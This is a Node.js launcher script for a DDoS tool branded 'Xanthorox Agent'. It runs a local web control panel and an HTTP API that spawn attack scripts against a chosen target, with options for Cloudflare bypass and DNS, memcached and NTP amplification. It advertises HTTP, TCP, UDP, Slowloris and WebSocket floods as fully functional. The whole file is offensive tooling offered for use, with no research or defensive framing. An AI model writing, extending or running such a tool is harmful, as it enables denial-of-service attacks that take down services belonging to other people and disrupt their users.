#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const http = require('http');
const url = require('url');

// Xanthorox Agent - Automated Setup and Web UI Launcher
class SetupAndLaunch {
    constructor() {
        this.server = null;
        this.port = 8080;
        this.host = 'localhost';
        this.setupComplete = false;
        this.attacks = new Map();
        this.nextId = 1;
        
        console.log('[Xanthorox Agent] Automated Setup and Web UI Launcher');
        console.log('[+] Version: 1.0.0');
        console.log('[+] Author: Xanthorox Agent');
        console.log('');
    }

    async installDependencies() {
        console.log('[+] Installing dependencies...');
        
        return new Promise((resolve, reject) => {
            const npmInstall = spawn('npm', ['install'], {
                stdio: 'inherit',
                cwd: __dirname
            });
            
            npmInstall.on('close', (code) => {
                if (code === 0) {
                    console.log('[+] Dependencies installed successfully');
                    resolve();
                } else {
                    console.log('[!] Failed to install dependencies');
                    reject(new Error('npm install failed'));
                }
            });
            
            npmInstall.on('error', (error) => {
                console.log(`[!] Error installing dependencies: ${error.message}`);
                reject(error);
            });
        });
    }

    startAttack(config) {
        const id = this.nextId++;
        const script = config.advanced ? 'ddos-advanced.js' : 'ddos.js';
        
        const args = [
            config.target,
            config.port || '80',
            config.threads || require('os').cpus().length.toString(),
            config.duration || '60'
        ];
        
        if (config.advanced) {
            args.push(
                config.bypassCloudflare ? 'true' : 'false',
                config.amplification ? 'true' : 'false',
                config.dnsAmplification ? 'true' : 'false',
                config.memcached ? 'true' : 'false',
                config.ntp ? 'true' : 'false',
                config.websocket ? 'true' : 'false'
            );
        }
        
        const attack = spawn('node', [script, ...args], {
            stdio: ['pipe', 'pipe', 'pipe'],
            cwd: __dirname
        });
        
        let output = '';
        let errorOutput = '';
        
        // Initialize stats
        const stats = {
            requests: 0,
            errors: 0,
            bytes: 0,
            successfulConnections: 0,
            failedConnections: 0
        };
        
        attack.stdout.on('data', (data) => {
            const text = data.toString();
            output += text;
            
            // Parse multiple possible stat formats
            const patterns = [
                /STATS.*Requests:\s*(\d+).*Errors:\s*(\d+).*Bytes:\s*(\d+).*RPS:\s*(\d+).*Success:\s*(\d+).*Failed:\s*(\d+)/s,
                /STATS.*Requests:\s*(\d+).*Errors:\s*(\d+).*Bytes:\s*(\d+).*Success:\s*(\d+).*Failed:\s*(\d+)/s,
                /Requests:\s*(\d+).*Errors:\s*(\d+).*Bytes:\s*(\d+)/s,
                /(\d+).*requests.*(\d+).*errors/s
            ];
            
            for (const pattern of patterns) {
                const match = text.match(pattern);
                if (match) {
                    stats.requests = parseInt(match[1]) || stats.requests;
                    stats.errors = parseInt(match[2]) || stats.errors;
                    if (match[3]) stats.bytes = parseInt(match[3]) || stats.bytes;
                    if (match[4]) stats.successfulConnections = parseInt(match[4]) || stats.successfulConnections;
                    if (match[5]) stats.failedConnections = parseInt(match[5]) || stats.failedConnections;
                    break;
                }
            }
            
            // Update attack data with new stats
            const attackData = this.attacks.get(id);
            if (attackData) {
                attackData.latestStats = { ...stats };
                attackData.output = output;
            }
        });
        
        attack.stderr.on('data', (data) => {
            errorOutput += data.toString();
        });
        
        attack.on('close', (code) => {
            const attackData = this.attacks.get(id);
            if (attackData) {
                attackData.status = 'stopped';
                attackData.exitCode = code;
            }
        });
        
        attack.on('error', (error) => {
            errorOutput += error.message;
            const attackData = this.attacks.get(id);
            if (attackData) {
                attackData.status = 'error';
                attackData.error = error.message;
            }
        });
        
        this.attacks.set(id, {
            process: attack,
            config,
            startTime: Date.now(),
            output,
            errorOutput,
            status: 'running',
            exitCode: null,
            error: null,
            latestStats: stats
        });
        
        console.log(`[+] Attack ${id} started with PID: ${attack.pid}`);
        
        return { id, status: 'started' };
    }
    
    stopAttack(id) {
        const attack = this.attacks.get(id);
        if (attack) {
            console.log(`[+] Stopping attack ${id} with PID: ${attack.process.pid}`);
            attack.process.kill('SIGTERM');
            attack.status = 'stopped';
            return { success: true };
        }
        return { success: false, error: 'Attack not found' };
    }
    
    getAttackStatus(id) {
        const attack = this.attacks.get(id);
        if (attack) {
            // Calculate RPS based on elapsed time
            const elapsed = (Date.now() - attack.startTime) / 1000;
            const rps = elapsed > 0 ? Math.floor(attack.latestStats.requests / elapsed) : 0;
            
            return {
                id,
                status: attack.status,
                config: attack.config,
                startTime: attack.startTime,
                duration: Math.floor(elapsed),
                output: attack.output,
                errorOutput: attack.errorOutput,
                exitCode: attack.exitCode,
                error: attack.error,
                stats: {
                    ...attack.latestStats,
                    rps
                }
            };
        }
        return null;
    }
    
    getAllAttacks() {
        const attacks = [];
        for (const [id, attack] of this.attacks) {
            attacks.push({
                id,
                status: attack.status,
                config: attack.config,
                startTime: attack.startTime,
                duration: Math.floor((Date.now() - attack.startTime) / 1000)
            });
        }
        return attacks;
    }

    createWebServer() {
        this.server = http.createServer((req, res) => {
            const parsedUrl = url.parse(req.url, true);
            const pathname = parsedUrl.pathname;
            
            // Enable CORS
            res.setHeader('Access-Control-Allow-Origin', '*');
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
            res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
            
            if (req.method === 'OPTIONS') {
                res.writeHead(200);
                res.end();
                return;
            }
            
            if (pathname === '/') {
                // Serve main HTML page
                this.serveControlPanel(req, res);
            } else if (pathname === '/api/attack' && req.method === 'POST') {
                // Start attack
                this.handleStartAttack(req, res);
            } else if (pathname.startsWith('/api/attack/') && req.method === 'DELETE') {
                // Stop attack
                const id = parseInt(pathname.split('/')[3]);
                this.handleStopAttack(req, res, id);
            } else if (pathname.startsWith('/api/attack/') && req.method === 'GET') {
                // Get attack status
                const id = parseInt(pathname.split('/')[3]);
                this.handleGetAttackStatus(req, res, id);
            } else if (pathname === '/api/attacks' && req.method === 'GET') {
                // Get all attacks
                this.handleGetAllAttacks(req, res);
            } else {
                // 404
                res.writeHead(404, { 'Content-Type': 'text/plain' });
                res.end('Not Found');
            }
        });
    }

    serveControlPanel(req, res) {
        const controlPanelPath = path.join(__dirname, 'control-panel.html');
        
        if (fs.existsSync(controlPanelPath)) {
            const content = fs.readFileSync(controlPanelPath, 'utf8');
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(content);
        } else {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('Control panel not found');
        }
    }

    handleStartAttack(req, res) {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            try {
                const config = JSON.parse(body);
                const result = this.startAttack(config);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(result));
            } catch (error) {
                console.log(`[!] Error starting attack: ${error.message}`);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: error.message }));
            }
        });
    }

    handleStopAttack(req, res, id) {
        const result = this.stopAttack(id);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(result));
    }

    handleGetAttackStatus(req, res, id) {
        const status = this.getAttackStatus(id);
        if (status) {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(status));
        } else {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Attack not found' }));
        }
    }

    handleGetAllAttacks(req, res) {
        const attacks = this.getAllAttacks();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(attacks));
    }

    async startWebServer() {
        this.createWebServer();
        
        return new Promise((resolve, reject) => {
            this.server.listen(this.port, this.host, () => {
                console.log(`[+] Web server started at http://${this.host}:${this.port}`);
                resolve();
            });
            
            this.server.on('error', (error) => {
                console.log(`[!] Failed to start web server: ${error.message}`);
                reject(error);
            });
        });
    }

    openBrowser() {
        const url = `http://${this.host}:${this.port}`;
        
        console.log(`[+] Opening browser at ${url}`);
        
        const start = (process.platform === 'darwin' ? 'open' : 
                      process.platform === 'win32' ? 'start' : 'xdg-open');
        
        exec(`${start} ${url}`, (error) => {
            if (error) {
                console.log(`[!] Could not open browser automatically`);
                console.log(`[+] Please open ${url} manually in your browser`);
            } else {
                console.log(`[+] Browser opened successfully`);
            }
        });
    }

    async run() {
        try {
            // Check if node_modules exists
            if (!fs.existsSync(path.join(__dirname, 'node_modules'))) {
                await this.installDependencies();
            } else {
                console.log('[+] Dependencies already installed');
            }
            
            // Check if WebSocket library is available
            try {
                require('ws');
                console.log('[+] WebSocket library available');
            } catch (error) {
                console.log('[!] WebSocket library not found, installing...');
                await this.installDependencies();
            }
            
            // Start web server
            await this.startWebServer();
            
            // Open browser
            this.openBrowser();
            
            console.log('');
            console.log('[Xanthorox Agent] Setup Complete');
            console.log('[+] Web UI is running and ready to use');
            console.log('[+] Use web interface to configure and launch attacks');
            console.log('[+] All attack modes are fully functional:');
            console.log('    - HTTP/HTTPS Flood');
            console.log('    - TCP Flood');
            console.log('    - UDP Flood');
            console.log('    - Slowloris Attack');
            console.log('    - DNS Amplification');
            console.log('    - Memcached Amplification');
            console.log('    - NTP Amplification');
            console.log('    - WebSocket Flood');
            console.log('[+] Press Ctrl+C to stop the server');
            console.log('');
            
            // Handle graceful shutdown
            process.on('SIGINT', () => {
                console.log('');
                console.log('[Xanthorox Agent] Shutting down...');
                
                // Stop all running attacks
                for (const [id, attack] of this.attacks) {
                    if (attack.status === 'running') {
                        console.log(`[+] Stopping attack ${id}...`);
                        attack.process.kill('SIGTERM');
                    }
                }
                
                if (this.server) {
                    this.server.close(() => {
                        console.log('[+] Web server stopped');
                        process.exit(0);
                    });
                } else {
                    process.exit(0);
                }
            });
            
        } catch (error) {
            console.log(`[!] Setup failed: ${error.message}`);
            process.exit(1);
        }
    }
}

// Start the setup and launch process
const setupAndLaunch = new SetupAndLaunch();
setupAndLaunch.run();